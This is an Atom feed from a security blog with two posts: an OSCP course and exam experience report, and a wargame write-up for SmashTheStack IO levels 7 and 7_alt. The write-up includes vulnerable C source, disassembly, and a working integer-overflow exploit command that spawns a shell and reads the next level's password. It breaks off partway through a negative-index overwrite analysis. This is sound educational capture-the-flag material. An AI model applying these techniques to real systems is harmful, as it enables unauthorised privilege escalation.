<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Security | OJ's perspective]]></title>
  <link href="http://buffered.io/categories/security/atom.xml" rel="self"/>
  <link href="http://buffered.io/"/>
  <updated>2013-08-25T11:40:28+10:00</updated>
  <id>http://buffered.io/</id>
  <author>
    <name><![CDATA[OJ Reeves]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[OSCP and Me]]></title>
    <link href="http://buffered.io/posts/oscp-and-me/"/>
    <updated>2013-08-16T20:33:00+10:00</updated>
    <id>http://buffered.io/posts/oscp-and-me</id>
    <content type="html"><![CDATA[<p>The <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="Penetration Testing with BackTrack">PWB</a> course by <a href="http://www.offensive-security.com/" title="Offensive Security">Offensive Security</a> is absolutely awesome, as is the exam which earns you the prized <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> certification. I took this course and exam recently; I loved it and I nailed it! I am now equipped with a much better understanding of the security world and am in a better position to help businesses improve the security of their application architecture and infrastructure.</p>

<p><a href="/contact" title="Contact OJ">Hit me up</a> and let's talk about how I can help you make your applications more secure.</p>

<p>What follows is the full story of my path through PWB and OSCP. Enjoy.</p>

<!--more-->


<h2>The Long Version</h2>

<p>I started developing software professionally back in 1999, just shy of 15 years ago. Since then I've been fortunate enough to work in some pretty amazing domains, used a massive variety of technologies and have played a part in some <a href="http://burnoutrevenge.ea.com/360/player.asp?language=en" title="Burnout Revenge for Xbox 360">pretty</a> <a href="https://internetbanking.suncorpbank.com.au/" title="Suncorp Internet Banking">awesome</a> <a href="http://www.innovation.gov.au/Industry/Defence/CapabilityDirectories/Documents/JSFCapabilityDirectory/company%20profiles/ball_solutions/profile_3.html" title="Mission Data Planning Environment">software</a>. I'm proud of what I've achieved so far. However I've recently found myself looking for a new challenge. Something that will make me think, push me to learn new things, and hopefully keep my motivation levels up to a high level. Ultimately, I wanted to have a bit of a career change without really changing my career.</p>

<p>Towards the end of last year, after some careful deliberation, I decided to follow a long-term passion of mine with a goal of incorporating it into my work. That passion is <a href="http://en.wikipedia.org/wiki/Information_security" title="Information Security">Information Security</a>. Infosec as a domain is made up of a <em>lot</em> of different areas, and hence making it a point of focus means that anyone looking to get involved needs to first learn the basics of a broad set of topics and then, perhaps, <em>specialise</em> in one of them.</p>

<p>For many years I've <a href="http://buffered.io/categories/rce/" title="Category: RCE">dabbled with reverse engineering</a>, kept up-to-date with various security topics, and have been quite a <a href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/" title="XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies">security-minded developer</a>. I didn't want to just go and read up on the things that I already knew, but instead I wanted to throw myself in the deep end into an area that I wasn't too familiar with but had a keen interest in.</p>

<p>This led me to <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Test">penetration testing</a> and ultimately to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a>.</p>

<h2>Exploring OSCP</h2>

<p>I spent quite a bit of time searching for courses and material that would get me going with the basics of penetration testing servers and web applications. There's quite a lot out there, though much of it is rudimentary, is disjoint or lacks cohesion, or talks about "point and shoot" exploitation. While this might be helpful in becoming a <a href="http://en.wikipedia.org/wiki/Script_kiddie" title="Script Kiddie">script kiddie</a> it wasn't what I was looking for. I wanted to be challenged.</p>

<p>When I stumbled on <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> I was initially dubious as I am when it comes to any certification. Most developers out there are probably experienced with the certifications that exist in the world of software engineering and how they do not provide an indication of a person's ability. Before knowing better I assumed this would be the same.</p>

<p>However, after <a href="http://proactivedefender.blogspot.com/2012/01/oscp-my-review.html">reading</a> <a href="http://www.hackyeah.com/2010/12/brief-review-of-the-pwb-class-and-the-oscp-certification/">some</a> <a href="http://blog.nullmode.com/2013/05/penetration-testing-with-backtrack-oscp.html">reviews</a> from people who have achieved the certification, I started to realise that this is exactly the kind of thing I was looking for.</p>

<p>Quotes from these reviews include lines such as:</p>

<blockquote><p>The truism "anything worth having doesn't come easy" is one I have often remembered when on a particularly difficult path to a goal. Never have the words rung quite so true when applied to my quest for [the] OSCP certification.</p></blockquote>

<p>Others state:</p>

<blockquote><p>The OSCP certification, in my opinion, proves that it's holder is able to identify vulnerabilities, create and modify exploit code, exploit hosts, and successfully preform tasks on the compromised systems over various operating systems.</p></blockquote>

<p>I was becoming convinced that OSCP was something that I had to do, despite not ever doing any form of penetration testing in the past (other than fumbling around my own web applications). At this point I reached out to a local security professional, <a href="http://security.crudtastic.com/" title="Security with added Cheese">Ash D</a> who is a seasoned Infosec guru, SANS mentor/teacher and who has passed the exam himself, and bribed him with a free lunch to come and talk to me about his experience. He turned out to be friendly, fun, informative and gave me just the confirmation I was looking for. Even if I failed miserably I'd already made a good friend out of the experience (a friend who later would keep encouraging me right through to the end <a href="http://security.crudtastic.com/?p=699">and beyond</a>, thanks Ash).</p>

<p>OSCP requires you to spend a lot of time in a virtual lab practising the various techniques that you'll need to master to do well in the exam. While the learning material from Offensive Security is good (more on this later), the lab is what makes the whole thing <strong>great</strong>. This was the last key point for me. I wasn't just going to learn theory, I would actually learn to <em>do</em> things and have to <em>demonstrate</em> that in the exam to gain the certification.</p>

<h2>Getting Started</h2>

<p>It was early 2013 and I was working some longer hours for various clients which made it hard for me to find the time to put into some basic preparation. As a result it took me quite a while to sign up for the course as I wanted to make sure that I would be able to give it the time it deserves.</p>

<p>As April 2013 approached I came to the realisation that it was <em>never</em> a good time to sign up for something like this and hence I should just go and make it happen. I spoke to my wife and kids about it and made sure they were OK with the idea of me being locked away to learn, and they gave me their full support (short interlude: my family is awesome).</p>

<p>I jumped on the web and went to the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="PWB sign up">sign-up</a> page and was presented with quite a few options. I needed to specify how much lab time I wanted prior to my exam. This was a bit like telling a mobile phone carrier how many calls you're going to make; I really wasn't sure! Instead of deliberating for too long, I decided to go with the 30-day option and extend my time if I felt that I needed more. No big deal.</p>

<p>I signed up for the course, and locked in the date of June 16th to kick off my time in the labs.I was really excited, and couldn't wait for it to start. In the following days I was contacted by Offsec and asked for proof of identity. Offsec require that you don't use a "free" email address such as Gmail when signing up, however I don't have any email addresses that aren't Google Apps hosted (this will change soon) and hence I needed to verify my identity with them. This goes to show that they don't just let any unknown person take up the course to learn things which can easily be misused.</p>

<p>After what felt like an eternity, June 16th came around and my connection pack arrived in my inbox. Unfortunately for me, work and a few other things took over and I lost the first week of time. I was able to connect to the labs on the odd occasion but for very short periods of time. Given that I wasn't yet across the material that time I spent in the labs wasn't really fruitful.</p>

<p>At day 8 things finally settled down to a level where I was able to dive into the material and begin fumbling my way through the lab. This is where things really started to become entertaining.</p>

<h2>Initial Lab Time</h2>

<p>My first few days in the lab were interesting. I popped the SYSTEM account on one of the Windows boxes in the first 4 hours of my lab time. This was not only surprising but it gave me a confidence boost which didn't do me any favours. From there I failed repeatedly to compromise another machine. The second day yielded no results. The third day was also fruitless. By the end of the fourth day, when I still had just <em>one</em> machine on my tally, I was beginning to ask myself questions. Am I cut out for this? Have I bitten off more than I can chew?</p>

<p>I stepped back for a while and pondered my approach. I realised that I wasn't thinking and looking to learn. I wasn't approaching the problems like a hacker would. I wasn't doing enumeration properly. I was investing too much time looking for out-of-the-box exploits rather than trying to connect the dots myself. I gave myself a slap, and started again.</p>

<p>This is when things started to change. Machines started to fall. I started to learn more. I improved in all the areas I was failing at before. It was wonderful.</p>

<p>On the fifth day I managed to pop 7 machines. What a difference!</p>

<h2>Proper Lab Time</h2>

<p><em>Note: my coverage of the lab from here is "point in time". Offsec change and upgrade the lab all the time, and hence details of the lab and what you'll experience will change over time too.</em></p>

<p>The lab was a wonderful place to play, practice and learn. I was constantly blown away by the mixture of operating systems, patch levels, kernel versions, system application and feature versions, third-party applications, and even custom applications that had been built which emulated the kind of things you'd expect a developer to throw together to help them do something a little easier and quicker as part of their day job. The effort that has gone into the design and set up of the lab environment is commendable. It really felt like I was in a real network with real machines and real people using those machines.</p>

<p>It was made up of approximately 60 machines partitioned into a number of networks. Each machine has it's own identity and story, some are interesting and some not so much. I'm not going to elaborate on the detail too much because discovering that is all part of the fun. But I will say that I experienced <code>Pain</code> and <code>Sufference</code> [sic] in ways I didn't expect.</p>

<p>The networks are connected together in interesting ways, and you as the penetration tester will need to work your way through the machines and networks, pivoting your attacks off compromised hosts as you go with the end goal of compromising all of the hosts and making it to the <strong>Admin</strong> network.</p>

<p>As you would expect, some machines are very easy to break into and other machines are really quite hard. The beauty of the lab is that, depending on your background, exposure and interests, the machines that you find hard might not be hard for others and vice-versa. Some machines run applications you wouldn't expect them to run. Some machines have very new or very old configurations of software. The mix is truly great; it keeps you thinking rather than giving you the luxury of slipping into a "routine".</p>

<p>The lab exposes you to a very large range of exploitations; too many to mention here. Chances are that if a type of exploit exists that you need to abuse, you'll get the chance to use it in the lab.</p>

<p>At this point I think it's important to point out that in OSCP the focus is on knowing how to apply existing public exploits and known approaches to manual exploitation of vulnerabilities. While there is room for you to construct your own exploits if you choose to, there is another course offered by Offsec which covers that in more detail, and that's <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>.</p>

<p>It took me a little bit of time before I realised that exploitation wasn't the only thing that I needed to do while in the lab. <em>Post-exploitation</em> was very important. Looting the machines that I'd compromised was something that I didn't consider doing in the early days, and I suffered as a result. When I came to realise that the keys to some of the machines were located on others, I had to go back through my list of popped hosts and loot them properly. If you're going to do this course, make sure you do a good job of post-exploitation!</p>

<p>While doing the lab, you are supposed to keep track of all the work you've done as you need to provide a deliverable at the end of it: a full penetration test document. This document has to contain the detail of what you did and how you did it. My advice is to not put this off until the end, but instead work on it as you go. This includes screenshots, dumps of console output, source code to exploits you've written and scripts you've used to automate tasks.</p>

<p>Even though I was pretty good at taking notes, I had kept them all in markdown in a private <a href="http://git-scm.org/" title="Git">git</a> repository instead of putting them in a well-structured document. As a result, I had to do this after my exam, which made the experience more painful than it needed to be.</p>

<h2>Post-Lab</h2>

<p>By then time your lab time has ended, you <em>should</em> have managed to compromise/pop/pwn a large percentage of the networks, if not 100%. In my case, I ran out of time and I missed about 8 machines in total. While I was disappointed with the result, a discussion with various OSCP alumni led me to realise that I had managed to defeat the harder machines in the labs and hence the rest of them would be quite simple. I decided not to extend my lab time as spending extra money for the sake of a few more machines didn't make sense. Instead, I booked in my exam for August 6th and used the lead-up time for practice, refining my documentation, and preparing my scripts and cheat sheets for the big day.</p>

<p>There are some great resources out there for practising this kind of thing, but the main one that I want to point out is <a href="http://vulnhub.com/" title="Vulnhub">Vulnhub</a> (a pet project of <a href="http://blog.g0tmi1k.com/" title="g0tmi1k's blog">g0tmi1k</a>). That site contains downloadable <em>boot2root</em> images that you can use to practice on with the added benefit of it all being legal.</p>

<p>I really focused on the areas that I felt I was weakest, with the main one being Linux privilege escalation. There's a bit of material out there on it, and there's also g0tmi1lk's fantastic <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html" title="Basic Linux Privilege Escalation">cheat sheet</a>, but I still failed to connect some of the dots during my travels. It's about now I must give a bit hat-tip to <a href="https://twitter.com/pipesec" title="Pipes on Twitter">Pipes</a> and <a href="https://twitter.com/metlstorm" title="Metlstorm on Twitter">Metlstorm</a>, both of <a href="http://www.insomniasec.com/" title="Insomnia Security">Insomnia Security</a>, for being two awesome mentors and providing me with fantastic insights on ways to get root. Those guys are awesome.</p>

<h2>The Exam</h2>

<p>The OSCP exam is a 24-hour "loser takes all" style exam. You are given access to a custom network, just like you are in the labs, and you have a number of machines assigned to you. The exam pack contains information on the machines, along with various rules that you must adhere to when attacking them. Each machine is worth a number of points and you earn those points if you:</p>

<ul>
<li>Compromise the host.</li>
<li>Document your findings well enough with clear instructions on how it was done. This document should also contain the  "flags"; text files with what appears to be random characters in them which prove that you did what you did.</li>
<li>Don't break the rules.</li>
</ul>


<p>Points are allocated to you even if you don't managed to get SYSTEM/root on the machine. All is not lost if you can't do privilege escalation! However you <em>can not</em> break the rules. In my exam, for example, there was at least one machine which wasn't allowed to be attacked at all using <a href="http://metasploit.org/" title="Metasploit">MSF</a>. Breaking this rule would have meant 0 points for that machine.</p>

<p>I started my exam at 8am just as the family were leaving the house (taking son #1 to school). I was buzzing. I couldn't sit still I was that excited. I realised how much I had missed my time in the labs and the thought of having another crack was making me twitchy.</p>

<p>By 8:45am I had popped root on my first machine.</p>

<p>By 10:00am the second had fallen. I was on a roll! I was riding high and felt really good.</p>

<p>The third machine proved to be a little more difficult, but it fell just before 1:00pm.</p>

<p>The last two machines, making a total of five, were quite a bit trickier. I'd say that the fourth was by far the hardest, but I loved it as it was yet another example of where I learned something new while doing something in an Offsec lab. I w00ted like a teenager when it fell and did a victory lap around the house.</p>

<p>By 10pm I was done with all 5 machines. My notes were in the typical markdown/git repository structure but were quite thorough and had captured everything I had done in quite a lot of detail. With the exam out of the way, and 100 points in the bag, I went to bed.</p>

<p>The following day I had the arguably arduous task of writing my exam document, which was supposed to be included with your lab report. All in all my document totalled 220 pages by the time it was done and I was glad to see the back of it! It was submitted late on Wednesday evening but with plenty of time to spare before the 8am Thursday cut-off.</p>

<p>I was done. I was relieved, excited and sad that it was all over.</p>

<h2>Confirmation</h2>

<p>While I was pretty sure that I'd done a good enough job to get my certification, there is always some doubt that you might have missed something or done something silly. So until I received confirmation from Offsec I wasn't sure if I had passed.</p>

<p>It took less than 48 hours for me to receive the email:</p>

<blockquote><p>Dear Oliver,</p>

<p>We are happy to inform you that you have successfully completed the Penetration Testing with BackTrack certification challenge and have obtained your Offensive Security Certified Professional (OSCP) certification.</p>

<p>You will receive the certification by mail within 80 days.</p></blockquote>

<p>I was elated. What a journey! I really felt like I had achieved something. I truly felt, and still feel, that I'd be able to do a great job performing a penetration test for a client.</p>

<h2>Summary &amp; Conclusion</h2>

<p>There's no denying it, OSCP was just fantastic. But same parts of it were <em>hard</em>. Not impossibly hard, but hard enough to make you question your own abilities. It broke my ego and then built it up again. I can't recommend it strongly enough!</p>

<p>However if you're new to the security game, this probably isn't the first thing you should attempt to tackle. I think I managed to get through thanks to my polyglot development background, my history with a mixture of operating systems, and my time reverse engineering various binaries. Without those things I would have had a very, <em>very</em> hard time.</p>

<p>I'm very happy that I took this challenge on. I feel like I really achieved something and that I have a certification that means a whole more than the paper it's written on. I can't wait to see the official paperwork come through the mail.</p>

<p>So what's next? Certification-wise it has to be <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>, but I will give my family a break before I take that on. Work-wise, I will be looking to engage with new and existing clients to determine how best I can help them with the security of their infrastructure and applications in the hope that this becomes a major part of my work longer term.</p>

<p>If you're out there reading this and you are looking for some help in this area, please <a href="/contact" title="Contact OJ">drop me a line</a>.</p>

<p>Thank you all for reading. Feel free to hit me with any questions and I'll do my best to answer them.</p>

<p><a href="https://twitter.com/TheColonial" title="OJ on Twitter">OJ</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Levels 7 and 7_alt - IO at STS]]></title>
    <link href="http://buffered.io/posts/levels-7-and-7_alt-io-at-sts/"/>
    <updated>2013-08-15T13:51:00+10:00</updated>
    <id>http://buffered.io/posts/levels-7-and-7_alt-io-at-sts</id>
    <content type="html"><![CDATA[<p>I've been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven't had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They're great fun.</p>

<!--more-->


<h2>Spoiler Alert</h2>

<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven't done these levels yourself yet, and you plan to, then please don't read this until you've nailed them yourself. I'd hate for this to ruin your experience.</p>

<p>However, if you've done the level or you're just interested in what's involved, please read on.</p>

<h2>Connecting</h2>

<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won't be sharing passwords here).</p>

<p>{% codeblock lang:bash %}
$ ssh level7@io.smashthestack.org
{% endcodeblock %}</p>

<p>Let's see what challenges there are for us:</p>

<p>{% codeblock lang:bash %}
level7@io:~$ ls /levels/level07*
/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
{% endcodeblock %}</p>

<p>This level has two possible entry points, and we'll be covering both in this post.</p>

<h2>Level 07</h2>

<p>We start by looking at the source of the target program:</p>

<p>{% codeblock level07.c lang:c %}
//written by bla</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main(int argc, char **argv)
{</p>

<pre><code>    int count = atoi(argv[1]);
    int buf[10];

    if(count &gt;= 10 ) 
            return 1;

    memcpy(buf, argv[2], count * sizeof(int));

    if(count == 0x574f4c46) {
            printf("WIN!\n");
            execl("/bin/sh", "sh" ,NULL);
    } else
            printf("Not today son\n");

    return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>What's clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that's written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won't be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>

<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>

<p>What's interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>

<p>{% codeblock lang:bash %}
gdb$ disas main
Dump of assembler code for function main:
0x08048414 &lt;main+0>:    push   ebp
0x08048415 &lt;main+1>:    mov    ebp,esp
0x08048417 &lt;main+3>:    sub    esp,0x68
0x0804841a &lt;main+6>:    and    esp,0xfffffff0
0x0804841d &lt;main+9>:    mov    eax,0x0
0x08048422 &lt;main+14>:   sub    esp,eax
0x08048424 &lt;main+16>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048427 &lt;main+19>:   add    eax,0x4
0x0804842a &lt;main+22>:   mov    eax,DWORD PTR [eax]
0x0804842c &lt;main+24>:   mov    DWORD PTR [esp],eax
0x0804842f &lt;main+27>:   call   0x8048354 &lt;atoi@plt>
0x08048434 &lt;main+32>:   mov    DWORD PTR [ebp-0xc],eax
0x08048437 &lt;main+35>:   cmp    DWORD PTR [ebp-0xc],0x9
0x0804843b &lt;main+39>:   jle    0x8048446 &lt;main+50>
0x0804843d &lt;main+41>:   mov    DWORD PTR [ebp-0x4c],0x1
0x08048444 &lt;main+48>:   jmp    0x80484ad &lt;main+153>
0x08048446 &lt;main+50>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048449 &lt;main+53>:   shl    eax,0x2                          <- here
0x0804844c <main+56>:   mov    DWORD PTR [esp+0x8],eax
0x08048450 &lt;main+60>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048453 &lt;main+63>:   add    eax,0x8
0x08048456 &lt;main+66>:   mov    eax,DWORD PTR [eax]
0x08048458 &lt;main+68>:   mov    DWORD PTR [esp+0x4],eax
0x0804845c &lt;main+72>:   lea    eax,[ebp-0x48]
0x0804845f &lt;main+75>:   mov    DWORD PTR [esp],eax
0x08048462 &lt;main+78>:   call   0x8048334 &lt;memcpy@plt>
0x08048467 &lt;main+83>:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
0x0804846e &lt;main+90>:   jne    0x804849a &lt;main+134>
0x08048470 &lt;main+92>:   mov    DWORD PTR [esp],0x8048584
0x08048477 &lt;main+99>:   call   0x8048344 &lt;printf@plt>
0x0804847c &lt;main+104>:  mov    DWORD PTR [esp+0x8],0x0
0x08048484 &lt;main+112>:  mov    DWORD PTR [esp+0x4],0x804858a
0x0804848c &lt;main+120>:  mov    DWORD PTR [esp],0x804858d
0x08048493 &lt;main+127>:  call   0x8048324 &lt;execl@plt>
0x08048498 &lt;main+132>:  jmp    0x80484a6 &lt;main+146>
0x0804849a &lt;main+134>:  mov    DWORD PTR [esp],0x8048595
0x080484a1 &lt;main+141>:  call   0x8048344 &lt;printf@plt>
0x080484a6 &lt;main+146>:  mov    DWORD PTR [ebp-0x4c],0x0
0x080484ad &lt;main+153>:  mov    eax,DWORD PTR [ebp-0x4c]
0x080484b0 &lt;main+156>:  leave<br/>
0x080484b1 &lt;main+157>:  ret  <br/>
End of assembler dump.
{% endcodeblock %}</p>

<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let's have a look at that in action by whipping up a sample program and viewing the output:</p>

<p>{% codeblock Testing Shifts Source lang:c %}
int main(int argc, char **argv)
{</p>

<pre><code>int x = -2147483647;
printf("%p\n", x);
printf("%p\n", x &lt;&lt; 2);
printf("%p\n", (x + 16) &lt;&lt; 2);
printf("%p\n", (x + 32) &lt;&lt; 2);
return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>Compile this code with <code>gcc</code> and run it, and you'll find the following:</p>

<p>{% codeblock Testing Shifts lang:bash %}
level7@io:/tmp/tc7$ ./a.out
0x80000001
0x4
0x44
0x84
{% endcodeblock %}</p>

<p>So we can pass in a negative integer, have it shift and turn it into a positive that's big enough to overflow the buffer. Once we've overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it'll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let's see how this looks:</p>

<p>{% codeblock Exploit Run lang:bash %}
level7@io:$ /levels/level07 -2147483600 <code>perl -e 'print "\x46\x4c\x4f\x57" x 100'</code>
WIN!
sh-4.1$ cat /home/level8/.pass
&lt;&lt; -- password was printed here -- >>
{% endcodeblock %}</p>

<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>

<h2>Level 07 alt</h2>

<p>Let's start with the source of the alternate application, modified a little by me (and highlighted):</p>

<p>{% codeblock level07_alt.c lang:c %}
/*</p>

<pre><code>Coding by LarsH

PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,
this program can also be used to get the letter frequencies from a text  &lt;-- I added this
TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.
which helps when cracking standard monosubstitution ciphers              &lt;-- I added this
</code></pre>

<p>*/</p>

<h1>include &lt;stdio.h></h1>

<p>static int count[256];</p>

<p>int main(int argc, char **argv) {</p>

<pre><code>int i, j;

if(argc == 1) {
    printf("Usage: %s words\n", argv[0]);
    return 1;
}

/* Clear out the frequency buffer */
for(i=0; i&lt;256; i++)
    count[i] = 0;

/* Fill the frequency buffer */
for(j=1; argv[j]; j++)
    for(i=0; argv[j][i]; i++)
        count[argv[j][i]]++;

/* Print out the frequency buffer */
for(i=0; i&lt;256; i++)
    if(count[i])
        printf("%c found %i time%s\n", i, count[i], count[i]-1?"s":"");

return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>On the surface it's hard to see where this application could be attacked! It's one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:</p>

<p>{% codeblock lang:c %}
count[argv[j][i]]++;
{% endcodeblock %}</p>

<p>Here the code is using the <code>j</code>th word (passed in on the command line via <code>argv</code>) and accessing its <code>i</code>th character, then using this character as an index into <code>count</code> to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in <code>argv</code> are <em>signed</em> characters, and hence we can pass in values that are <strong>negative</strong> and write outside the bounds of the <code>count</code> array. Let's <code>objdump</code> the binary to see where <code>count</code> lives:</p>

<p>{% codeblock lang:bash %}
$ objdump -D /levels/level07_alt | grep count
08049720 <count>:
{% endcodeblock %}</p>

<p>The negative values we can use are from <code>CHAR_MIN</code> (<code>-128</code>) &times; <code>sizeof(int)</code> (<code>4</code> on a 32-bit system) to <code>0</code>. So with <code>count</code> located at <code>0x8049720</code>, it means we can write values from here, all the way back to <code>0x8049520</code>. Let's see what fits within this range, again by looking at the output of <code>objdump</code>:</p>

<p>{% codeblock lang:bash %}
$ objdump -D /levels/level07_alt
... snip ...</p>

<p>Disassembly of section .ctors:</p>

<p>080495ec <__CTOR_LIST__>:
 80495ec:   ff                      (bad)<br/>
 80495ed:   ff                      (bad)<br/>
 80495ee:   ff                      (bad)<br/>
 80495ef:   ff 00                   incl   (%eax)</p>

<p>080495f0 <__CTOR_END__>:
 80495f0:   00 00                   add    %al,(%eax)
  ...</p>

<p>Disassembly of section .dtors:</p>

<p>080495f4 <__DTOR_LIST__>:
 80495f4:   ff                      (bad)<br/>
 80495f5:   ff                      (bad)<br/>
 80495f6:   ff                      (bad)<br/>
 80495f7:   ff 00                   incl   (%eax)</p>

<p>080495f8 <__DTOR_END__>:
 80495f8:   00 00                   add    %al,(%eax)
  ...</p>

<p>Disassembly of section .jcr:</p>

<p>080495fc <__JCR_END__>:
 80495fc:   00 00                   add    %al,(%eax)
  ...</p>

<p>Disassembly of section .dynamic:</p>

<p>08049600 <_DYNAMIC>:
 8049600:   01 00                   add    %eax,(%eax)
 8049602:   00 00                   add    %al,(%eax)
 8049604:   10 00                   adc    %al,(%eax)
 8049606:   00 00                   add    %al,(%eax)
 8049608:   0c 00                   or     $0x0,%al
 804960a:   00 00                   add    %al,(%eax)
 804960c:   78 82                   js     8049590 &lt;<strong>FRAME_END</strong>+0xfa8>
 804960e:   04 08                   add    $0x8,%al
 8049610:   0d 00 00 00 9c          or     $0x9c000000,%eax
 8049615:   85 04 08                test   %eax,(%eax,%ecx,1)
 8049618:   04 00                   add    $0x0,%al
 804961a:   00 00                   add    %al,(%eax)
 804961c:   48                      dec    %eax
 804961d:   81 04 08 f5 fe ff 6f    addl   $0x6ffffef5,(%eax,%ecx,1)
 8049624:   70 81                   jo     80495a7 &lt;<strong>FRAME_END</strong>+0xfbf>
 8049626:   04 08                   add    $0x8,%al
 8049628:   05 00 00 00 e0          add    $0xe0000000,%eax
 804962d:   81 04 08 06 00 00 00    addl   $0x6,(%eax,%ecx,1)
 8049634:   90                      nop
 8049635:   81 04 08 0a 00 00 00    addl   $0xa,(%eax,%ecx,1)
 804963c:   4c                      dec    %esp
 804963d:   00 00                   add    %al,(%eax)
 804963f:   00 0b                   add    %cl,(%ebx)
 8049641:   00 00                   add    %al,(%eax)
 8049643:   00 10                   add    %dl,(%eax)
 8049645:   00 00                   add    %al,(%eax)
 8049647:   00 15 00 00 00 00       add    %dl,0x0
 804964d:   00 00                   add    %al,(%eax)
 804964f:   00 03                   add    %al,(%ebx)
 8049651:   00 00                   add    %al,(%eax)
 8049653:   00 d4                   add    %dl,%ah
 8049655:   96                      xchg   %eax,%esi
 8049656:   04 08                   add    $0x8,%al
 8049658:   02 00                   add    (%eax),%al
 804965a:   00 00                   add    %al,(%eax)
 804965c:   18 00                   sbb    %al,(%eax)
 804965e:   00 00                   add    %al,(%eax)
 8049660:   14 00                   adc    $0x0,%al
 8049662:   00 00                   add    %al,(%eax)
 8049664:   11 00                   adc    %eax,(%eax)
 8049666:   00 00                   add    %al,(%eax)
 8049668:   17                      pop    %ss
 8049669:   00 00                   add    %al,(%eax)
 804966b:   00 60 82                add    %ah,-0x7e(%eax)
 804966e:   04 08                   add    $0x8,%al
 8049670:   11 00                   adc    %eax,(%eax)
 8049672:   00 00                   add    %al,(%eax)
 8049674:   58                      pop    %eax
 8049675:   82                      (bad)<br/>
 8049676:   04 08                   add    $0x8,%al
 8049678:   12 00                   adc    (%eax),%al
 804967a:   00 00                   add    %al,(%eax)
 804967c:   08 00                   or     %al,(%eax)
 804967e:   00 00                   add    %al,(%eax)
 8049680:   13 00                   adc    (%eax),%eax
 8049682:   00 00                   add    %al,(%eax)
 8049684:   08 00                   or     %al,(%eax)
 8049686:   00 00                   add    %al,(%eax)
 8049688:   fe                      (bad)<br/>
 8049689:   ff                      (bad)<br/>
 804968a:   ff 6f 38                ljmp   <em>0x38(%edi)
 804968d:   82                      (bad)<br/>
 804968e:   04 08                   add    $0x8,%al
 8049690:   ff                      (bad)<br/>
 8049691:   ff                      (bad)<br/>
 8049692:   ff 6f 01                ljmp   </em>0x1(%edi)
 8049695:   00 00                   add    %al,(%eax)
 8049697:   00 f0                   add    %dh,%al
 8049699:   ff                      (bad)<br/>
 804969a:   ff 6f 2c                ljmp   *0x2c(%edi)
 804969d:   82                      (bad)<br/>
 804969e:   04 08                   add    $0x8,%al
  ...</p>

<p>Disassembly of section .got:</p>

<p>080496d0 &lt;.got>:
 80496d0:   00 00                   add    %al,(%eax)
  ...</p>

<p>Disassembly of section .got.plt:</p>

<p>080496d4 <_GLOBAL_OFFSET_TABLE_>:
 80496d4:   00 96 04 08 00 00       add    %dl,0x804(%esi)
 80496da:   00 00                   add    %al,(%eax)
 80496dc:   00 00                   add    %al,(%eax)
